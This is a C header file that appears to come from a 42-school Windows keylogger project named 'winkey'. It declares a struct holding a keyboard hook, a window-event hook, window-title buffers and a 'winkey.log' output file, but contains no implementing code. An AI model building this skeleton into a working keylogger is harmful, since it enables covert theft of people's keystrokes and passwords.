/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   winkey.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: marvin <marvin@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/09/22 08:33:20 by marvin            #+#    #+#             */
/*   Updated: 2025/09/22 08:33:20 by marvin           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef WINKEY_H
# define WINKEY_H

# define WIN32_LEAN_AND_MEAN
# include <windows.h>
# include <conio.h>
# include <winuser.h>
# include <stdio.h>
# include <stdint.h>
# include <stdlib.h>

# define WINDOW_TITLE_SIZE 256
# define KEYLOG_FILE "winkey.log"

typedef struct s_winkey {
	HHOOK 			keyboard_hook;
	HWINEVENTHOOK	window_hook;
	char			window_title[WINDOW_TITLE_SIZE];
	char			window_prev[WINDOW_TITLE_SIZE];
	char 			path[256];
	FILE			*keylog;
}	t_winkey;



#endif
